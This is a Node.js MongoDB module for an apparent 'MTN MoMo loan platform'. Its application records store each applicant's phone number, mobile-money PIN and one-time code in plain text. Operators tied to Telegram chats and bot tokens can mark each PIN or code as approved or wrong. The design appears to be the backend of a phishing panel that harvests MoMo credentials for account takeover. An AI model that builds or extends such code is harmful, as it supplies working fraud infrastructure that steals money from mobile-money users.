const { MongoClient } = require('mongodb');

let client;
let db;

// Database and collections
const DB_NAME = 'mtn_momo_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    ENVIRONMENT_LOGS: 'environment_logs'
};

/**
 * Connect to MongoDB with connection pooling safety
 */
async function connectDatabase() {
    if (db) return db; // Return existing connection if initialized

    try {
        const MONGODB_URI = process.env.MONGODB_URI;

        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI is not set in environment variables');
        }

        console.log('🔄 Connecting to MongoDB (MTN MoMo Platform)...');

        client = new MongoClient(MONGODB_URI, {
            maxPoolSize: 10,
            minPoolSize: 2,
            serverSelectionTimeoutMS: 5000
        });

        await client.connect();
        db = client.db(DB_NAME);

        console.log('✅ Connected to MongoDB successfully');

        await createIndexes();

        return db;
    } catch (error) {
        console.error('❌ MongoDB connection error:', error);
        throw error;
    }
}

/**
 * Create database indexes in parallel
 */
async function createIndexes() {
    try {
        await Promise.all([
            db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true }),
            db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 }),
            db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 }),
            db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 }),

            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true }),
            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 }),
            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 }),
            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 }),
            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 }),
            db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 }),

            db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 }),
            db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 }),
            db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 })
        ]);

        console.log('✅ Database indexes created');
    } catch (error) {
        console.error('⚠️ Error creating indexes:', error.message);
    }
}

/**
 * Close database connection safely
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        db = null;
        client = null;
        console.log('✅ Database connection closed');
    }
}

// ==========================================
// ENVIRONMENT LOGS OPERATIONS
// ==========================================

async function logAdminActivity(adminId, action, details = {}) {
    try {
        if (!db) return;
        const logEntry = {
            adminId,
            action,
            details,
            timestamp: new Date().toISOString()
        };
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
        console.log(`📝 Environment Log [${action}] recorded for admin: ${adminId}`);
    } catch (error) {
        console.error('❌ Error recording environment log:', error);
    }
}

async function getEnvironmentLogs(query = {}, limit = 100) {
    try {
        return await db.collection(COLLECTIONS.ENVIRONMENT_LOGS)
            .find(query)
            .sort({ timestamp: -1 })
            .limit(limit)
            .toArray();
    } catch (error) {
        console.error('❌ Error getting environment logs:', error);
        return [];
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;

        if (!adminId)         throw new Error('Admin ID is required (adminId or id property)');
        if (!adminData.name)  throw new Error('Admin name is required');
        if (!adminData.email) throw new Error('Admin email is required');
        if (!adminData.chatId) throw new Error('Admin chatId is required');

        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin ${adminId} already exists in database`);

        const normalizedChatId = String(adminData.chatId).trim();

        const adminDocument = {
            adminId,
            name:      adminData.name,
            email:     adminData.email,
            chatId:    normalizedChatId,
            status:    adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };

        if (adminData.botToken) adminDocument.botToken = adminData.botToken;

        console.log(`💾 Saving admin to database:`, {
            adminId: adminDocument.adminId,
            name:    adminDocument.name,
            email:   adminDocument.email,
            chatId:  adminDocument.chatId,
            status:  adminDocument.status
        });

        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        
        await logAdminActivity(adminId, 'ADMIN_CREATED', { name: adminData.name, email: adminData.email });

        console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name})`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    if (!chatId) return null;
    const strChatId = String(chatId).trim();
    const numChatId = Number(strChatId);

    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({
            $or: [
                { chatId: strChatId },
                { chatId: isNaN(numChatId) ? strChatId : numChatId }
            ]
        });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        const payload = { ...updates, updatedAt: new Date().toISOString() };
        if (payload.chatId) {
            payload.chatId = String(payload.chatId).trim();
        }

        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: payload }
        );
        
        await logAdminActivity(adminId, 'ADMIN_UPDATED', updates);

        console.log(`🔄 Admin ${adminId} updated`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        
        await logAdminActivity(adminId, 'ADMIN_STATUS_UPDATED', { status });

        console.log(`🔄 Admin ${adminId} status updated to: ${status}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        
        await logAdminActivity(adminId, 'ADMIN_DELETED', {});

        console.log(`🗑️ Admin deleted: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id:              appData.id,
            adminId:         appData.adminId,
            adminName:       appData.adminName,
            phoneNumber:     appData.phoneNumber,
            pin:             appData.pin,
            pinStatus:       appData.pinStatus  || 'pending',
            otpStatus:       appData.otpStatus  || 'pending',
            otp:             appData.otp        || null,
            assignmentType:  appData.assignmentType,
            isReturningUser: appData.isReturningUser || false,
            previousCount:   appData.previousCount   || 0,
            timestamp:       appData.timestamp || new Date().toISOString()
        });

        if (appData.adminId) {
            await logAdminActivity(appData.adminId, 'APPLICATION_CREATED', { applicationId: appData.id, phoneNumber: appData.phoneNumber });
        }

        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );

        const app = await getApplication(applicationId);
        if (app && app.adminId) {
            await logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates });
        }

        console.log(`🔄 Application updated: ${applicationId}`);
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({
                adminId,
                $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
            })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS
// ==========================================

async function getAdminStats(adminId) {
    try {
        const stats = await db.collection(COLLECTIONS.APPLICATIONS).aggregate([
            { $match: { adminId } },
            {
                $group: {
                    _id: null,
                    total: { $sum: 1 },
                    pinPending: { $sum: { $cond: [{ $eq: ['$pinStatus', 'pending'] }, 1, 0] } },
                    pinApproved: { $sum: { $cond: [{ $eq: ['$pinStatus', 'approved'] }, 1, 0] } },
                    otpPending: { $sum: { $cond: [{ $eq: ['$otpStatus', 'pending'] }, 1, 0] } },
                    fullyApproved: { $sum: { $cond: [{ $eq: ['$otpStatus', 'approved'] }, 1, 0] } }
                }
            }
        ]).toArray();

        if (stats.length > 0) {
            const { _id, ...counts } = stats[0];
            return counts;
        }

        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const [totalAdmins, appStats] = await Promise.all([
            db.collection(COLLECTIONS.ADMINS).countDocuments({}),
            db.collection(COLLECTIONS.APPLICATIONS).aggregate([
                {
                    $group: {
                        _id: null,
                        totalApplications: { $sum: 1 },
                        pinPending: { $sum: { $cond: [{ $eq: ['$pinStatus', 'pending'] }, 1, 0] } },
                        pinApproved: { $sum: { $cond: [{ $eq: ['$pinStatus', 'approved'] }, 1, 0] } },
                        otpPending: { $sum: { $cond: [{ $eq: ['$otpStatus', 'pending'] }, 1, 0] } },
                        fullyApproved: { $sum: { $cond: [{ $eq: ['$otpStatus', 'approved'] }, 1, 0] } },
                        totalRejected: {
                            $sum: {
                                $cond: [
                                    {
                                        $or: [
                                            { $eq: ['$pinStatus', 'rejected'] },
                                            { $eq: ['$otpStatus', 'wrongpin_otp'] },
                                            { $eq: ['$otpStatus', 'wrongcode'] }
                                        ]
                                    },
                                    1,
                                    0
                                ]
                            }
                        }
                    }
                }
            ]).toArray()
        ]);

        const counts = appStats[0] || {};
        return {
            totalAdmins,
            totalApplications: counts.totalApplications || 0,
            pinPending:        counts.pinPending || 0,
            pinApproved:       counts.pinApproved || 0,
            otpPending:        counts.otpPending || 0,
            fullyApproved:     counts.fullyApproved || 0,
            totalRejected:     counts.totalRejected || 0
        };
    } catch (error) {
        console.error('❌ Error getting stats:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, ...stats };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error);
        return [];
    }
}

// ==========================================
// DEBUG & MAINTENANCE
// ==========================================

async function getAllAdminsDetailed() {
    try {
        const admins = await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        console.log(`📊 Found ${admins.length} admins in database`);
        admins.forEach(admin => {
            console.log(`   ${admin.adminId}: ${admin.name} (chatId: ${admin.chatId}, status: ${admin.status})`);
        });
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' },
                { chatId: { $exists: false } },
                { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up invalid admins:', error);
        throw error;
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,

    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,

    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,

    logAdminActivity,
    getEnvironmentLogs,

    getAdminStats,
    getStats,
    getPerAdminStats,

    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
